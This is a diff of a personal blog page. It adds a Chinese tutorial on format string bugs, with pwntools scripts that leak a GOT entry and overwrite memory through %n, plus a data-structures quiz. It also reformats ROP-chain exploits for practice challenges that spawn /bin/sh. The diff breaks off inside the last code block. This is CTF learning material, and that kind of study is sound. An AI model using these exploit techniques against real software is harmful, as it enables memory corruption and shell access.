@@ -252,6 +252,423 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/pwn学习（4）初识格式化字符串漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/pwn学习（4）初识格式化字符串漏洞/" itemprop="url">pwn学习（4）初识格式化字符串漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:44:06+08:00">
+                2018-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="什么是格式化字符串？"><a href="#什么是格式化字符串？" class="headerlink" title="什么是格式化字符串？"></a>什么是格式化字符串？</h1><p>这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数</p>
+<pre><code>#include&lt;stdio.h&gt;
+int main()
+{
+    printf(&quot;this is a format string %s&quot; , &quot;yes&quot;);
+    return 0;
+}
+</code></pre><p>它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容</p>
+<p>下面是几个常见的说明符</p>
+<pre><code>%d - 十进制 - 输出十进制整数
+%s - 字符串 - 从内存中读取字符串
+%x - 十六进制 - 输出十六进制数
+%c - 字符 - 输出字符
+%p - 指针 - 指针地址
+%n - 到目前为止所写的字符数
+</code></pre><p>这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。<br>因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”</p>
+<h1 id="漏洞在哪？"><a href="#漏洞在哪？" class="headerlink" title="漏洞在哪？"></a>漏洞在哪？</h1><p>如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：</p>
+<pre><code>char str[100]
+scanf(&quot;%s&quot;,str)
+printf(&quot;%s&quot;,str)
+</code></pre><p>代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：</p>
+<pre><code>printf(str)
+</code></pre><p>这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）</p>
+<pre><code>#include &lt;stdio.h&gt;
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf(&quot;%s&quot;, s);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
+  printf(s);
+  return 0;
+}
+</code></pre><p>可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据</p>
+<pre><code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+</code></pre><p>然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：</p>
+<pre><code>00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825
+</code></pre><p>很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA</p>
+<h1 id="泄漏任意内存地址"><a href="#泄漏任意内存地址" class="headerlink" title="泄漏任意内存地址"></a>泄漏任意内存地址</h1><p>通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏</p>
+<p>还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。</p>
+<p>首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。</p>
+<p>话不多说，上脚本</p>
+<pre><code>from pwn import *
+sh = process(&apos;./leakmemory&apos;)
+leakmemory = ELF(&apos;./leakmemory&apos;)
+__isoc99_scanf_got = leakmemory.got[&apos;__isoc99_scanf&apos;]
+print hex(__isoc99_scanf_got)
+payload = p32(__isoc99_scanf_got) + &apos;%4$s&apos;
+print payload
+gdb.attach(sh)
+sh.sendline(payload)
+sh.recvuntil(&apos;%4$s\n&apos;)
+print hex(u32(sh.recv()[4:8])) 
+sh.interactive()
+
+0x804a014
+\x14\xa0\x0%4$s
+[*] running in new terminal: /usr/bin/gdb -q  &quot;./leakmemory.dms&quot; 8086 -x &quot;/tmp/pwn2rdIM1.gdb&quot;
+[+] Waiting for debugger: Done
+0xf7de20c0
+[*] Switching to interactive mode
+</code></pre><p>成功拿到了scanf在got表中的地址</p>
+<h1 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h1><p>那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍</p>
+<p><strong>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</strong></p>
+<p>这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）</p>
+<pre><code>/* example/overflow/overflow.c */
+#include &lt;stdio.h&gt;
+int a = 123, b = 456;
+int main() {
+  int c = 789;
+  char s[100];
+  printf(&quot;%p\n&quot;, &amp;c);
+  scanf(&quot;%s&quot;, s);
+  printf(s);
+  if (c == 16) {
+    puts(&quot;modified c.&quot;);
+  } else if (a == 2) {
+    puts(&quot;modified a for a small number.&quot;);
+  } else if (b == 0x12345678) {
+    puts(&quot;modified b for a big number!&quot;);
+  }
+  return 0;
+}
+</code></pre><p>简单看看，程序会输出变量c的地址，然后有个格式化字符串的漏洞，本来if判断c是不成立的，那我们就利用这个漏洞来改变c的值来让它符合。</p>
+<p>首先还是用我们刚才的泄漏栈变量的方式（也就是上面的方法）确定偏移</p>
+<pre><code>0xfff5de4c
+AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+AAAAfff5dde8,c2,f7e7a6bb,fff5de0e,fff5df0c,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78
+</code></pre><p>可以看到偏移是6，那我们就知道了payload最后应该是%6$n，我们的目标是让c变成16，我们一开始输入的是拿p32()处理过的c的地址，只有4位，还缺12位，我们就补个%012d，让程序随便打12个数据就好了，分析完毕，上脚本！</p>
+<pre><code>from pwn import *
+sh = process(&apos;./overwrite.dms&apos;)
+c_addr = int(sh.recvuntil(&apos;\n&apos;, drop=True), 16)
+print hex(c_addr)
+payload = p32(c_addr) + &apos;%012d&apos; + &apos;%6$n&apos;
+print payload
+#gdb.attach(sh)
+sh.sendline(payload)
+print sh.recv()
+sh.interactive()
+</code></pre><p>successful！</p>
+<p>那今天就先到这里了～明天估计会有格式化字符串的第二篇，以及栈溢出的更多的玩法，具体还是要看我的学习进度了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/数据结构基础-顺序表/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/数据结构基础-顺序表/" itemprop="url">数据结构基础--顺序表</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:30:37+08:00">
+                2018-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。</strong></p>
+<p>答案为<em>T</em>，顺序存储的线性表可以利用偏移轻松拿到每一个元素，但是如果要增加一个元素的话则需要把之后的所有的元素都后移一位。</p>
+<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用顺序表存储最节省时间。</strong></p>
+<p>答案为<em>T</em>，因为比起链表形式找一个元素需要遍历，顺序表直接用偏移就ok了，而且如果只是在最后进行插入删除的话也无需移动大量元素</p>
+<p><strong>对于顺序存储的长度为N的线性表，删除第一个元素和插入最后一个元素的时间复杂度分别对应为O(1)和O(N)。</strong></p>
+<p>答案为<em>F</em>，删除第一个元素需要把之后所有的元素依次提前一个，所以应该为N，而插入最后一个元素直接在最后插入即可</p>
+<p><strong>(neuDS)在顺序表中逻辑上相邻的元素，其对应的物理位置也是相邻的。</strong></p>
+<p>答案为<em>T</em>，线性表是随机存储的，所以物理位置是相邻的</p>
+<p><strong>(neuDS)所谓随机存取，就是通过首地址和元素的位序号值可以在O(1)的时间内找到指定的元素。</strong></p>
+<p>答案为<em>T</em>，这个在之前的链表选择判断里说过了</p>
+<p><strong>(neuDS)顺序存储的线性表不支持随机存取。</strong></p>
+<p>答案为<em>F</em>，和上边的那个一样</p>
+<p><strong>(neuDS)在顺序表上进行插入、删除操作时需要移动元素的个数与待插入或待删除元素的位置无关。</strong></p>
+<p>答案为<em>F</em>，显然是错误的，因为你每次的插入删除操作都是要移动后面所有的元素的</p>
+<p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度为：</strong></p>
+<p>答案为<em>O(1), O(N)</em>，访问结点直接用偏移，而增加结点需要把这个元素后面的所有元素都移动。</p>
+<p><strong>在N个结点的顺序表中，算法的时间复杂度为O(1)的操作是：</strong></p>
+<p>答案为<em>访问第i个结点（1≤i≤N）和求第i个结点的直接前驱（2≤i≤N）</em>，随机存储不再说了</p>
+<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用哪种存储方式最节省时间？</strong></p>
+<p>答案为<em>顺序表</em>，参考上面，懒得再说了</p>
+<p><strong>顺序表中第一个元素的存储地址是100，每个元素的长度为2，则第5个元素的地址是（ ）。</strong></p>
+<p>答案为<em>108</em>，100是第一个元素的，第二个是102，依次类推，逆向的应该都懂</p>
+<p><strong>(neuDS)线性表的顺序存储结构是一种( ) </strong></p>
+<p>答案为<em>随机存取的存储结构</em>，懒得说了</p>
+<p><strong>(neuDS)一个顺序表所占用的存储空间大小与( )无关。</strong></p>
+<p>答案为<em>元素的存放顺序</em>，其实主要取决于元素的多少和元素的类型（包括元素所含有的子元素的类型）</p>
+<p><strong>(neuDS)要将一个顺序表{a0,a1,……,an−1}中第i个数据元素ai(0≤i≤n-1)删除，需要移动（ ）个数据元素。</strong></p>
+<p>答案为<em>n-i-1 </em>，因为要删除第i个，所以它后面的元素你都要向前移动一个，而由于顺序表是0开始的，最后一个元素是n-1，所以也就是n-1-i，也就是答案了</p>
+<p><strong>若长度为n的线性表采用顺序存储结构，那么删除它的第i个数据元素之前，需要它一次向前移动（）个数据元素。</strong></p>
+<p>答案为<em>n-i </em>和上面的一样</p>
+<p><strong>若长度为n的线性表采用顺序结构，在第i个数据元素之前插入一个元素，需要它依次向后移动（）个元素</strong></p>
+<p>答案为<em>n-i+1</em>，要注意插入和删除的区别，因为删除时，你移动的只是原来位置元素的后面的元素，而插入的话除了原来元素的后面的元素，还要多移动一个原来的元素，所以也就是要+1了</p>
+<p><strong>线性表L=（a1, a2 ,……，an ）用一维数组表示，假定删除线性表中任一元素的概率相同（都为1/n），则删除一个元素平均需要移动元素的个数是（）。</strong></p>
+<p>答案为<em>(n-1)/2 </em>，其实这个问题和1+2+3+…+9有点像，因为第n个和倒数第n个总能凑成一对，然后除2就完了，当然你要是想不通的话也可以用等差数列做…</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -730,7 +1147,7 @@
 <p><img src="https://i.loli.net/2018/11/18/5bf14f537133d.jpg" alt="1.jpg"></p>
 <p>其实还是老思路，利用ROPgadgets找到合适的gadget然后构造ROP chain就可以了，这里我们就选择倒数第三个了</p>
 <p>天时地利都有了，上exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line"></span><br><span class="line">one\_addr = elf.plt[<span class="string">'callme\_one'</span>]</span><br><span class="line"></span><br><span class="line">two\_addr = elf.plt[<span class="string">'callme\_two'</span>]</span><br><span class="line"></span><br><span class="line">three\_addr = elf.plt[<span class="string">'callme\_three'</span>]</span><br><span class="line"></span><br><span class="line">pop\_addr = <span class="number">0x080488a9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>\*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload+= p32(one\_addr)+p32(pop\_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload+= p32(two\_addr)+p32(pop\_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload+= p32(three\_addr)+p32(pop\_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line">one_addr = elf.plt[<span class="string">'callme_one'</span>]</span><br><span class="line">two_addr = elf.plt[<span class="string">'callme_two'</span>]</span><br><span class="line">three_addr = elf.plt[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_addr = <span class="number">0x080488a9</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line">payload+= p32(one_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload+= p32(two_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload+= p32(three_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>说实话我没搞懂为什么这个题目为啥叫这个名字……还是ida先看一下</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f4909e87.jpg" alt="2.jpg"></p>
 <p>嗯，有system函数但没有/bin/sh字符串，也就是说我们的任务就是想办法把/bin/sh写进去</p>
@@ -738,13 +1155,13 @@
 <p>可以看到bss段恰好有合适的空间可以放，那下一步就该找合适的gadgets来构造rop chain了</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f5a59406.jpg" alt="4.jpg"></p>
 <p>可以看到正好有将ebp写入edi地址的mov以及pop ebp和edi，我们就利用这两个来实现写入bss段，最后再通过system函数就搞定了。话不多说，上exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./write432'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./write432'</span>)</span><br><span class="line"></span><br><span class="line">data\_addr = <span class="number">0x804A040</span></span><br><span class="line"></span><br><span class="line">system\_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">mov\_edi\_ebp = <span class="number">0x8048670</span></span><br><span class="line"></span><br><span class="line">pop\_edi\_ebp = <span class="number">0x80486da</span></span><br><span class="line"></span><br><span class="line">pad = <span class="number">44</span>\*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">payload = pad + p32(pop\_edi\_ebp) + p32(data\_addr) + <span class="string">'/bin'</span> + p32(mov\_edi\_ebp)</span><br><span class="line"></span><br><span class="line">payload += p32(pop\_edi\_ebp) + p32(data\_addr + <span class="number">4</span>) + <span class="string">'/sh\\x00'</span> + p32(mov\_edi\_ebp)</span><br><span class="line"></span><br><span class="line">payload += p32(system\_addr) + <span class="string">'b'</span>\*<span class="number">4</span> + p32(data\_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p = process(<span class="string">'./write432'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./write432'</span>)</span><br><span class="line">data_addr = <span class="number">0x804A040</span></span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">mov_edi_ebp = <span class="number">0x8048670</span></span><br><span class="line">pop_edi_ebp = <span class="number">0x80486da</span></span><br><span class="line">pad = <span class="number">44</span>*<span class="string">'a'</span></span><br><span class="line">payload = pad + p32(pop_edi_ebp) + p32(data_addr) + <span class="string">'/bin'</span> + p32(mov_edi_ebp)</span><br><span class="line">payload += p32(pop_edi_ebp) + p32(data_addr + <span class="number">4</span>) + <span class="string">'/sh\x00'</span> + p32(mov_edi_ebp)</span><br><span class="line">payload += p32(system_addr) + <span class="string">'b'</span>*<span class="number">4</span> + p32(data_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>可以看到这道题比起前面的题目就是多了个bad char的检测，也就是说我们不能够输入一些程序认为的“敏感”字符了，那我们应该怎么办呢？其实思路很简单，我们可以先将字符串加密处理，把加密后的字符串写进去，然后在进行解密处理，如此一来就绕过了bad char的检测</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f5b28a5d.jpg" alt="5.jpg"></p>
 <p>思路大致还是构造rop chain，但是这次我们要寻找一下能够实现加密功能的gadgets，比如add、xor这样的指令，并且还得有配合写入寄存器的pop指令，我们直接拿工具搜索一下</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f5d4045d.jpg" alt="6.jpg"></p>
 <p>可以看到确实有我们需要的gadgets，我们简单梳理一下思路，首先我们要把我们的目标字符串写入目标地址，这里可以借助上一个题目的思路将字符串mov进去，而xor的是ebx和cl，那我们就需要pop这两个寄存器实现写入内容，其中一个是加密的密钥，另外一个就应该是我们的字符串所在地址，思路有了就顺着写exp就好了，上代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./badchars32'</span>)</span><br><span class="line"></span><br><span class="line">system\_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">xor\_ebx\_cl = <span class="number">0x8048890</span></span><br><span class="line"></span><br><span class="line">pop\_ebx\_ecx = <span class="number">0x8048896</span></span><br><span class="line"></span><br><span class="line">mov\_edi\_esi = <span class="number">0x8048893</span></span><br><span class="line"></span><br><span class="line">pop\_edi\_esi = <span class="number">0x8068899</span></span><br><span class="line"></span><br><span class="line">data\_addr = <span class="number">0x804A040</span></span><br><span class="line"></span><br><span class="line">bin = <span class="string">'/bin/sh\\x00'</span></span><br><span class="line"></span><br><span class="line">xor\_byte = <span class="number">0x1b</span></span><br><span class="line"></span><br><span class="line">bad\_char = [<span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">xor\_bin=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin:</span><br><span class="line"></span><br><span class="line">c = ord(i)^xor\_byte</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> bad\_char:</span><br><span class="line"></span><br><span class="line">xor\_byte += <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">xor\_bin+=chr(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(xor\_bin)==<span class="number">8</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">pad = <span class="string">'a'</span>\*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload = pad + p32(pop\_edi\_esi) +xor\_bin[:<span class="number">4</span>]+ p32(data\_addr) +p32(mov\_edi\_esi) + p32(pop\_edi\_esi)+xor\_bin[<span class="number">4</span>:<span class="number">8</span>]+p32(data\_addr+<span class="number">4</span>) +p32(mov\_edi\_esi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(xor\_bin)):</span><br><span class="line"></span><br><span class="line">payload += p32(pop\_ebx\_ecx) + p32(data\_addr+i) + p32(xor\_byte) + p32(xor\_ebx\_cl)</span><br><span class="line"></span><br><span class="line">payload+= p32(system\_addr) + <span class="number">4</span>\*<span class="string">'a'</span> +p32(data\_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars32'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 